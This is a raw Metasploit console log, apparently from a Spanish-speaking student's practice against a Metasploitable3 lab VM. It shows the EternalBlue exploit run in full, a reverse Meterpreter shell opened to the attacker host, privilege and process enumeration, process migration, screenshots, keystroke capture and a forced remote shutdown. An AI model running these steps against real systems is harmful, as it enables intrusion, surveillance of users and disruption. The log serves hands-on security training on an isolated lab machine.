+07/13/2009  06:40 PM            97,280 efsadu.dll
+11/20/2010  08:24 PM           304,128 efscore.dll
+07/13/2009  06:40 PM            56,832 efslsaext.dll
+07/13/2009  06:40 PM            37,376 efssvc.dll
+07/13/2009  06:39 PM            12,800 efsui.exe
+07/13/2009  06:40 PM            34,816 efsutil.dll
+11/20/2010  08:24 PM           144,896 EhStorAPI.dll
+07/13/2009  06:39 PM           140,288 EhStorAuthn.exe
+07/13/2009  06:40 PM           111,616 EhStorPwdMgr.dll
+07/13/2009  06:40 PM           203,264 EhStorShell.dll
+07/13/2009  08:20 PM    <DIR>          el-GR
+07/13/2009  06:40 PM           241,664 els.dll
+07/13/2009  06:40 PM            45,568 ELSCore.dll
+07/13/2009  06:40 PM            14,336 elsext.dll
+07/13/2009  06:40 PM           647,680 elslad.dll
+11/20/2010  08:24 PM            25,600 elsTrans.dll
+11/20/2010  10:56 PM    <DIR>          en
+03/19/2023  02:21 AM    <DIR>          en-US
+07/13/2009  06:40 PM            24,576 encapi.dll
+02/02/2015  08:30 PM           284,672 EncDump.dll
+07/13/2009  06:40 PM           290,304 energy.dll
+07/13/2009  06:40 PM            75,264 eqossnap.dll
+11/20/2010  08:32 PM    <DIR>          es-ES
+07/13/2009  06:40 PM           402,944 es.dll
+07/13/2009  06:40 PM            53,248 EscMigPlugin.dll
+07/13/2009  06:39 PM            12,288 escUnattend.exe
+11/20/2010  08:24 PM         2,565,632 esent.dll
+07/13/2009  06:40 PM            39,424 esentprf.dll
+07/13/2009  06:39 PM           139,264 esentutl.exe
+07/13/2009  08:20 PM    <DIR>          et-EE
+07/13/2009  06:40 PM            16,384 eventcls.dll
+07/13/2009  06:39 PM            45,056 eventcreate.exe
+06/10/2009  01:57 PM            17,935 EventViewer_EventDetails.xsl
+07/13/2009  06:39 PM            81,920 eventvwr.exe
+06/10/2009  01:58 PM           145,127 eventvwr.msc
+07/13/2009  06:40 PM            96,768 evntagnt.dll
+07/13/2009  06:39 PM            25,600 evntcmd.exe
+07/13/2009  06:39 PM           138,240 evntwin.exe
+07/13/2009  06:39 PM            65,536 expand.exe
+11/20/2010  08:24 PM         1,866,240 ExplorerFrame.dll
+07/13/2009  06:39 PM            62,464 extrac32.exe
+07/13/2009  06:27 PM            34,816 f3ahvoas.dll
+11/20/2010  08:24 PM           355,328 Faultrep.dll
+07/13/2009  06:39 PM            24,064 fc.exe
+11/20/2010  08:24 PM           105,984 FCMgrDLL.dll
+07/13/2009  06:40 PM            25,600 FCRegSvc.dll
+11/20/2010  08:24 PM           171,520 fde.dll
+11/20/2010  08:24 PM            72,192 fdeploy.dll
+07/13/2009  06:40 PM            16,384 fdPHost.dll
+07/13/2009  06:40 PM            51,200 fdPnp.dll
+07/13/2009  06:40 PM           296,448 fdprint.dll
+11/20/2010  08:24 PM            74,240 fdProxy.dll
+07/13/2009  06:40 PM            34,816 FDResPub.dll
+07/13/2009  06:40 PM            93,696 fdSSDP.dll
+07/13/2009  06:40 PM            28,160 fdWNet.dll
+07/13/2009  06:40 PM           132,096 fdWSD.dll
+10/02/2016  11:56 PM            29,568 FeatureInfoDl.xml
+07/13/2009  06:40 PM            51,712 feclient.dll
+07/13/2009  08:20 PM    <DIR>          fi-FI
+07/13/2009  06:40 PM           582,656 filemgmt.dll
+07/13/2009  06:39 PM            15,872 find.exe
+07/13/2009  06:40 PM            67,072 findnetprinters.dll
+11/20/2010  08:24 PM            71,168 findstr.exe
+07/13/2009  06:39 PM            11,264 finger.exe
+07/13/2009  06:38 PM             6,144 Firewall.cpl
+07/13/2009  06:40 PM           748,032 FirewallAPI.dll
+11/20/2010  08:24 PM           934,912 FirewallControlPanel.dll
+11/20/2010  08:24 PM            17,920 fixmapi.exe
+07/13/2009  06:40 PM            19,456 fltLib.dll
+07/13/2009  06:39 PM            23,552 fltMC.exe
+07/13/2009  06:40 PM            29,696 fmifs.dll
+11/20/2010  08:24 PM           116,224 fms.dll
+03/19/2023  02:05 AM           266,544 FNTCACHE.DAT
+11/20/2010  08:24 PM         1,137,664 FntCache.dll
+11/20/2010  08:24 PM           861,184 fontext.dll
+11/20/2010  08:24 PM           100,864 fontsub.dll
+07/13/2009  06:39 PM           109,056 fontview.exe
+07/13/2009  06:39 PM            51,712 forfiles.exe
+07/13/2009  04:25 PM            34,304 format.com
+11/20/2010  08:24 PM           121,344 fphc.dll
+07/13/2009  08:20 PM    <DIR>          fr-FR
+07/13/2009  04:38 PM            14,848 framebuf.dll
+12/08/2016  09:06 PM           246,784 framedyn.dll
+12/08/2016  09:06 PM           252,416 framedynos.dll
+06/10/2009  01:38 PM           144,909 fsmgmt.msc
+07/13/2009  06:39 PM            96,256 fsutil.exe
+11/20/2010  08:24 PM            48,128 ftp.exe
+06/10/2009  02:00 PM             6,179 ftp.mib
+07/13/2009  06:40 PM           194,560 fundisc.dll
+07/13/2009  06:40 PM           111,616 fwcfg.dll
+07/13/2009  06:40 PM           324,096 FWPUCLNT.DLL
+07/13/2009  06:40 PM            75,776 FwRemoteSvr.dll
+11/20/2010  08:24 PM            57,856 g711codc.ax
+07/13/2009  06:40 PM            58,880 gacinstall.dll
+06/10/2009  01:36 PM            40,552 gatherNetworkInfo.vbs
+07/13/2009  06:40 PM           128,512 gcdef.dll
+11/20/2010  08:24 PM           403,968 gdi32.dll
+07/13/2009  06:39 PM            89,600 getmac.exe
+07/13/2009  06:40 PM           452,096 glmf32.dll
+07/13/2009  06:40 PM           165,376 glu32.dll
+07/13/2009  06:40 PM            96,768 gpapi.dll
+07/13/2009  06:40 PM         1,000,960 gpedit.dll
+06/10/2009  01:47 PM           147,439 gpedit.msc
+11/20/2010  08:24 PM           784,896 gpprefcl.dll
+07/13/2009  06:40 PM            41,984 gpprnext.dll
+07/13/2009  06:39 PM           166,912 gpresult.exe
+07/13/2009  06:40 PM            32,256 gpscript.dll
+07/13/2009  06:39 PM            25,600 gpscript.exe
+11/20/2010  08:24 PM           777,728 gpsvc.dll
+07/13/2009  06:40 PM            22,528 gptext.dll
+07/13/2009  06:39 PM            17,408 gpupdate.exe
+07/13/2009  07:34 PM    <DIR>          GroupPolicy
+07/13/2009  07:34 PM    <DIR>          GroupPolicyUsers
+07/13/2009  06:39 PM            18,432 grpconv.exe
+11/20/2010  08:24 PM           263,040 hal.dll
+11/20/2010  08:24 PM            78,848 hbaapi.dll
+07/13/2009  06:40 PM            31,232 hcproviders.dll
+07/13/2009  06:38 PM           241,152 hdwwiz.cpl
+^C
+Terminate channel 2? [y/N]  y
+meterpreter > shell
+Process 4048 created.
+Channel 3 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>exit                                     
+exit
+meterpreter > shell
+Process 3308 created.
+Channel 4 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+metasploitable3\vagrant
+
+C:\Windows\system32>hostname
+hostname
+metasploitable3-win2k8
+
+C:\Windows\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection 2:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::3d69:66b0:d141:cea5%14
+   IPv4 Address. . . . . . . . . . . : 192.168.56.3
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : fd17:625c:f037:2:fd63:83a2:85e3:4729
+   Link-local IPv6 Address . . . . . : fe80::fd63:83a2:85e3:4729%11
+   IPv4 Address. . . . . . . . . . . : 10.0.2.15
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::2%11
+                                       10.0.2.2
+
+Tunnel adapter isatap.{88E22A3B-E94F-466A-B3CE-2A94D227957E}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter isatap.{6FEEDED4-FC1E-4857-BEB8-72167D5BDAA6}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+C:\Windows\system32>start "" notepad.exe
+start "" notepad.exe
+
+C:\Windows\system32>exit
+exit
+^C
+Terminate channel 4? [y/N]  y
+meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+ESTA PRUEBA ES PARA CAPTURAR TEXTO O NO SE
+
+meterpreter > keyscan_stop
+Stopping the keystroke sniffer...
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+[-] stdapi_ui_get_keys_utf8: Operation failed: Incorrect function.
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(windows/smb/ms17_010_eternalblue) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                 Information           Connection
+  --  ----  ----                 -----------           ----------
+  1         meterpreter x64/win  METASPLOITABLE3\vagr  192.168.56.4:4444 ->
+            dows                 ant @ METASPLOITABLE   192.168.56.3:49289
+                                 3                     (192.168.56.3)
+
+msf exploit(windows/smb/ms17_010_eternalblue) > sessions /i 1
+
+Active sessions
+===============
+
+  Id  Name  Type                 Information           Connection
+  --  ----  ----                 -----------           ----------
+  1         meterpreter x64/win  METASPLOITABLE3\vagr  192.168.56.4:4444 ->
+            dows                 ant @ METASPLOITABLE   192.168.56.3:49289
+                                 3                     (192.168.56.3)
+
+msf exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(windows/smb/ms17_010_eternalblue) > spool /root/captura_teclado.txt
+[-] Error while running command spool: Permission denied @ rb_sysopen - /root/captura_teclado.txt
+
+Call stack:
+/usr/share/metasploit-framework/lib/rex/ui/text/output/tee.rb:17:in `initialize'
+/usr/share/metasploit-framework/lib/rex/ui/text/output/tee.rb:17:in `open'
+/usr/share/metasploit-framework/lib/rex/ui/text/output/tee.rb:17:in `initialize'
+/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1437:in `new'
+/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1437:in `cmd_spool'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:582:in `run_command'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:531:in `block in run_single'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:165:in `block in run'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:37:in `with_context'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:133:in `run'
+/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:54:in `start'
+/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+/usr/bin/msfconsole:23:in `<main>'
+msf exploit(windows/smb/ms17_010_eternalblue) > spool /home/kali/captura_teclado.txt
+[*] Spooling to file /home/kali/captura_teclado.txt...
+msf exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+
+
+meterpreter > background
+[*] Backgrounding session 1...
+msf exploit(windows/smb/ms17_010_eternalblue) > spool off
+[*] Spooling is now disabled
+msf exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > keyscan_stop
+Stopping the keystroke sniffer...
+meterpreter > 
+[*] 192.168.56.3 - Meterpreter session 1 closed.  Reason: Died
+
+msf exploit(windows/smb/ms17_010_eternalblue) > ping -c 4 192.168.56.3
+[*] exec: ping -c 4 192.168.56.3
+
+PING 192.168.56.3 (192.168.56.3) 56(84) bytes of data.
+64 bytes from 192.168.56.3: icmp_seq=1 ttl=128 time=6.11 ms
+64 bytes from 192.168.56.3: icmp_seq=2 ttl=128 time=1.31 ms
+64 bytes from 192.168.56.3: icmp_seq=3 ttl=128 time=2.24 ms
+64 bytes from 192.168.56.3: icmp_seq=4 ttl=128 time=1.69 ms
+
+--- 192.168.56.3 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3004ms
+rtt min/avg/max/mdev = 1.309/2.837/6.112/1.919 ms
+msf exploit(windows/smb/ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 192.168.56.4:4444 
+[*] 192.168.56.3:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.56.3:445      - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.56.3:445      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.56.3:445 - The target is vulnerable.
+[*] 192.168.56.3:445 - Connecting to target for exploitation.
+[+] 192.168.56.3:445 - Connection established for exploitation.
+[+] 192.168.56.3:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.56.3:445 - CORE raw buffer dump (51 bytes)
+[*] 192.168.56.3:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[*] 192.168.56.3:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[*] 192.168.56.3:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[*] 192.168.56.3:445 - 0x00000030  6b 20 31                                         k 1             
+[+] 192.168.56.3:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.56.3:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.56.3:445 - Sending all but last fragment of exploit packet
+[*] 192.168.56.3:445 - Starting non-paged pool grooming
+[+] 192.168.56.3:445 - Sending SMBv2 buffers
+[+] 192.168.56.3:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.56.3:445 - Sending final SMBv2 buffers.
+[*] 192.168.56.3:445 - Sending last fragment of exploit packet!
+[*] 192.168.56.3:445 - Receiving response from exploit packet
+[+] 192.168.56.3:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.56.3:445 - Sending egg to corrupted connection.
+[*] 192.168.56.3:445 - Triggering free of corrupted buffer.
+[*] Sending stage (248902 bytes) to 192.168.56.3
+[*] Meterpreter session 2 opened (192.168.56.4:4444 -> 192.168.56.3:49242) at 2026-08-14 16:32:57 -0400
+[+] 192.168.56.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.56.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.56.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > sysinfo
+geComputer        : METASPLOITABLE3
+tuOS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
+idArchitecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+meterpreter > sysinfo
+Computer        : METASPLOITABLE3
+OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name        Arch  Session  User              Path
+ ---   ----  ----        ----  -------  ----              ----
+ 0     0     [System Pr
+             ocess]
+ 4     0     System      x64   0
+ 128   284   java.exe    x64   0        NT AUTHORITY\LOC  C:\openjdk6\openj
+                                        AL SERVICE        dk-1.6.0-unoffici
+                                                          al-b27-windows-am
+                                                          d64\jre\bin\java.
+                                                          exe
+ 252   4     smss.exe    x64   0        NT AUTHORITY\SYS  \SystemRoot\Syste
+                                        TEM               m32\smss.exe
+ 284   1760  cmd.exe     x64   0        NT AUTHORITY\LOC  C:\Windows\system
+                                        AL SERVICE        32\cmd.exe
+ 328   312   csrss.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\csrss.exe
+ 368   312   wininit.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system
+             e                          TEM               32\wininit.exe
+ 380   360   csrss.exe   x64   1        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\csrss.exe
+ 416   360   winlogon.e  x64   1        NT AUTHORITY\SYS  C:\Windows\system
+             xe                         TEM               32\winlogon.exe
+ 464   368   services.e  x64   0        NT AUTHORITY\SYS  C:\Windows\system
+             xe                         TEM               32\services.exe
+ 472   368   lsass.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\lsass.exe
+ 480   368   lsm.exe     x64   0        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\lsm.exe
+ 580   464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 644   464   VBoxServic  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+             e.exe                      TEM               32\VBoxService.ex
+                                                          e
+ 696   464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 704   464   svchost.ex  x64   0        NT AUTHORITY\NET
+             e                          WORK SERVICE
+ 776   464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 848   464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 896   464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 940   464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 1016  464   svchost.ex  x64   0        NT AUTHORITY\NET
+             e                          WORK SERVICE
+ 1096  464   spoolsv.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+             e                          TEM               32\spoolsv.exe
+ 1128  464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 1172  464   wrapper.ex  x86   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 1260  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1268  464   domain1Ser  x64   0        NT AUTHORITY\LOC
+             vice.exe                   AL SERVICE
+ 1348  464   elasticsea  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+             rch-servic                 TEM               elasticsearch-1.1
+             e-x64.exe                                    .1\bin\elasticsea
+                                                          rch-service-x64.e
+                                                          xe
+ 1356  1912  dcrotatelo  x86   0        NT AUTHORITY\LOC  C:\ManageEngine\D
+             gs.exe                     AL SERVICE        esktopCentral_Ser
+                                                          ver\apache\bin\dc
+                                                          rotatelogs.exe
+ 1364  328   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system
+             e                          TEM               32\conhost.exe
+ 1396  464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 1420  464   jenkins.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 1452  1172  java.exe    x86   0        NT AUTHORITY\LOC  C:\ManageEngine\D
+                                        AL SERVICE        esktopCentral_Ser
+                                                          ver\jre\bin\java.
+                                                          exe
+ 1480  1268  cmd.exe     x64   0        NT AUTHORITY\LOC  C:\Windows\system
+                                        AL SERVICE        32\cmd.exe
+ 1488  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1492  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1544  1480  java.exe    x64   0        NT AUTHORITY\LOC  C:\Program Files
+                                        AL SERVICE        (x86)\Common File
+                                                          s\Oracle\Java\jav
+                                                          apath\java.exe
+ 1600  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1756  1420  java.exe    x64   0        NT AUTHORITY\LOC  C:\Program Files
+                                        AL SERVICE        (x86)\Common File
+                                                          s\Oracle\Java\jav
+                                                          apath\java.exe
+ 1760  464   jmx.exe     x64   0        NT AUTHORITY\LOC
+                                        AL SERVICE
+ 1792  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1852  464   dcnotifica  x86   0        NT AUTHORITY\LOC
+             tionserver                 AL SERVICE
+             .exe
+ 1912  464   dcserverht  x86   0        NT AUTHORITY\LOC
+             tpd.exe                    AL SERVICE
+ 1940  1912  dcserverht  x86   0        NT AUTHORITY\LOC  C:\ManageEngine\D
+             tpd.exe                    AL SERVICE        esktopCentral_Ser
+                                                          ver\apache\bin\dc
+                                                          serverhttpd.exe
+ 2064  464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 2088  464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 2116  1544  java.exe    x64   0        NT AUTHORITY\LOC  C:\Program Files\
+                                        AL SERVICE        Java\jdk1.8.0_211
+                                                          \bin\java.exe
+ 2184  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 2240  464   snmp.exe    x64   0        NT AUTHORITY\SYS
+                                        TEM
+ 2252  1940  dcrotatelo  x86   0        NT AUTHORITY\LOC  C:\ManageEngine\D
+             gs.exe                     AL SERVICE        esktopCentral_Ser
+                                                          ver\apache\bin\dc
+                                                          rotatelogs.exe
+ 2260  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 3156  580   WmiPrvSE.e
+             xe
+ 3204  464   httpd.exe   x64   0        NT AUTHORITY\LOC
+                                        AL SERVICE
+ 3332  464   mysqld.exe  x64   0        NT AUTHORITY\SYS  c:\wamp\bin\mysql
+                                        TEM               \mysql5.5.20\bin\
+                                                          mysqld.exe
+ 3344  464   svchost.ex  x64   0        NT AUTHORITY\NET
+             e                          WORK SERVICE
+ 3376  464   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system
+             e                          TEM               32\svchost.exe
+ 3408  464   wlms.exe    x64   0        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\wlms\wlms.exe
+ 3640  464   taskhost.e  x64   1        METASPLOITABLE3\  C:\Windows\system
+             xe                         vagrant           32\taskhost.exe
+ 3756  3204  httpd.exe   x64   0        NT AUTHORITY\LOC  C:\wamp\bin\apach
+                                        AL SERVICE        e\apache2.2.21\bi
+                                                          n\httpd.exe
+ 4112  464   sppsvc.exe  x64   0        NT AUTHORITY\NET
+                                        WORK SERVICE
+ 4208  464   svchost.ex  x64   0        NT AUTHORITY\NET
+             e                          WORK SERVICE
+ 4348  940   dwm.exe     x64   1        METASPLOITABLE3\  C:\Windows\system
+                                        vagrant           32\Dwm.exe
+ 4508  4940  DesktopCen  x86   1        METASPLOITABLE3\  C:\ManageEngine\D
+             tral.exe                   vagrant           esktopCentral_Ser
+                                                          ver\bin\DesktopCe
+                                                          ntral.exe
+ 4752  4940  VBoxTray.e  x64   1        METASPLOITABLE3\  C:\Windows\System
+             xe                         vagrant           32\VBoxTray.exe
+ 4940  4560  explorer.e  x64   1        METASPLOITABLE3\  C:\Windows\Explor
+             xe                         vagrant           er.EXE
+ 5004  464   msdtc.exe   x64   0        NT AUTHORITY\NET
+                                        WORK SERVICE
+
+meterpreter > migrate 4940
+[*] Migrating from 1096 to 4940...
+[*] Migration completed successfully.
+meterpreter > getpid
+Current pid: 4940
+meterpreter > getuid
+Server username: METASPLOITABLE3\vagrant
+meterpreter > getdesktop
+Session 1\WinSta0\Default
+meterpreter > screenshot
+Screenshot saved to: /home/kali/cpzbxOOe.jpeg
+meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+la captura de texto en pantalla con<CR>
+<CR>
+<CR>
+<CR>
+<CR>
+<Right Shift><CR>
+<Right Shift>:<Shift>C<^H><Shift>C
+
+meterpreter > keyscan_stop
+Stopping the keystroke sniffer...
+meterpreter > keyscan_start
+Starting the keystroke sniffer ...
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+la captura de texto en pantalla con keyscan<Down><CR>
+<^H><Right><Down><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><Right><CR>
+funcion[o, pero no usamos /<^H>.txt porque<^H><^H>o<CR>
+la solucion que vimos era spool, pero eso<CR>
+guarda toda las <^H><^H> salida de consola y fomr<^H><^H>rt<^H>mato<CR>
+<Caps Lock>ANSI<Caps Lock>. y pues keylogger no nos sirvio<CR>
+<Right Shift>>c<^H><^H><Right Shift>:c
+
+meterpreter > keyscan_stop
+Stopping the keystroke sniffer...
+meterpreter > execute -f cmd.exe -c -i -a "/c timeout /t 30 & shutdown /s /t 0"Process 2012 created.
+Channel 1 created.                                                                   
+ERROR: Input redirection is not supported, exiting the process immediately.          
+meterpreter > screenshot                                                             
+[-] stdapi_ui_desktop_screenshot: Operation failed: The program issued a command but the command length is incorrect.
+meterpreter > execute -f cmd.exe -a "/c timeout /t 30 /nobreak & shutdown /s /t 0"
+Process 3424 created.
+meterpreter > screenshot
+Screenshot saved to: /home/kali/aqSszZTV.jpeg
+meterpreter > 
+[*] 192.168.56.3 - Meterpreter session 2 closed.  Reason: Died
+
